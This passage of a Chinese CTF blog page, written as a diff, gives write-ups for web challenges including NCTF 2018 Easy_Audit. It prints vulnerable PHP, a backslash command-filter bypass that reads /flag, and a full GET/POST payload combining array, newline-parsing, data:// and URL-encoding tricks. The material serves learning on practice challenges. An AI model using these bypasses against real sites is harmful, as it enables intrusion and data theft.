operator">%</span><span class="token number">0</span>FyE<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">DC</span><span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">B4</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span>DEc<span class="token operator">%</span><span class="token constant">C3</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token constant">DA29</span><span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token constant">C3</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">7</span>F<span class="token operator">%</span><span class="token number">8</span>B_h<span class="token operator">%</span><span class="token constant">C6</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token number">8</span>Bd8<span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token number">85</span><span class="token operator">%</span><span class="token number">7</span>C<span class="token operator">%</span><span class="token number">14</span>w<span class="token operator">%</span><span class="token number">06</span><span class="token operator">%</span><span class="token constant">C2</span><span class="token operator">%</span><span class="token number">3</span>AC<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">0</span>C<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">FD</span><span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token constant">CE</span><span class="token operator">%</span><span class="token number">16</span><span class="token operator">%</span><span class="token constant">CE</span><span class="token operator">%</span><span class="token constant">B7</span><span class="token operator">%</span><span class="token constant">B6</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token constant">F3</span><span class="token operator">%</span><span class="token number">9959</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">C2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>至于如何读取flag，这里ban掉了常见的读取命令，也ban了od，看了一下没ban反斜杠</p>
+<p>那么可以用反斜杠绕过关键词的过滤</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">cmd<span class="token operator">=</span>l\s <span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也可以用sort命令直接读取<code>sort /flag</code></p>
+<hr>
+<h1 id="NCTF-2018-Easy-Audit"><a href="#NCTF-2018-Easy-Audit" class="headerlink" title="[NCTF 2018]Easy_Audit"></a>[NCTF 2018]Easy_Audit</h1><blockquote>
+<p>PHP特性</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/yulige|flag|nctf/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yulige'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yulige'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yulige'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token comment">//日爆md5!!!!!!</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/nctfisfun$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nctf'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'nctfisfun'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$getflag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$getflag</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$getflag</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'ccc_liubi'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>审计下代码，</p>
+<ul>
+<li><p>先看底下的判断部分：</p>
+<p>首先要满足<code>substr($_GET[&#39;yulige&#39;], 32) === md5($_GET[&#39;yulige&#39;]</code></p>
+<p>这个只需要用数组返回false即可绕过</p>
+<p>然后是<code>preg_match(&#39;/nctfisfun$/&#39;, $_GET[&#39;nctf&#39;]) &amp;&amp; $_GET[&#39;nctf&#39;] !== &#39;nctfisfun&#39;</code></p>
+<p>这里看一眼apache的版本2.4.18，存在换行解析漏洞<code>%0a</code>可以绕过</p>
+<p>然后是读取文件匹配字符串，直接用data伪协议即可，然后就能得到flag</p>
+</li>
+<li><p>现在我们回来看上面对<code>$_SERVER</code>的解析的waf，要匹配的是<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>即get请求中<code>?</code>参数后的原始内容</p>
+<p>这个用url编码即可绕过</p>
+</li>
+<li><p>而对<code>$_REQUEST</code>的解析waf会把请求中的键值进行匹配，这里是会过滤字母</p>
+<p>但是<code>$_REQUEST</code>有个特性就是当GET和POST有相同的变量时，会优先匹配POST的变量，所以这里只要在POST请求再用同样的变量名传一个不是字母的值就行</p>
+</li>
+</ul>
+<p>最终payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token operator">%</span><span class="token number">79</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">6</span>C<span class="token operator">%</span><span class="token number">69</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">65</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">6</span>E<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">6</span>E<span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">69</span><span class="token operator">%</span><span class="token number">73</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">6</span>E<span class="token operator">%</span><span class="token number">0</span>a<span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">6</span>C<span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,ccc_liubi</span>
+<span class="token constant">POST</span><span class="token punctuation">:</span> yulige<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>nctf<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<hr>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
+         
+        
+    <div id="vcomments"></div>
+    
+        <script src="/blog/js/lib/valine.min.js"></script>
+            <script>
+                new Valine({
+                    el: '#vcomments',
+                    app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+                    app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+                    visitor: 'true',
+                    placeholder: '写点什么吧(●ˇ∀ˇ●)',
+                    serverURLs: 'https://u9mzlkun.lc-cn-e1-shared.com',
+                });
+            </script>
+
+        <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+            <span id="busuanzi_container_site_uv"> 
+                本站访客数<span id="busuanzi_value_site_uv"></span>人次
+            </span>
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
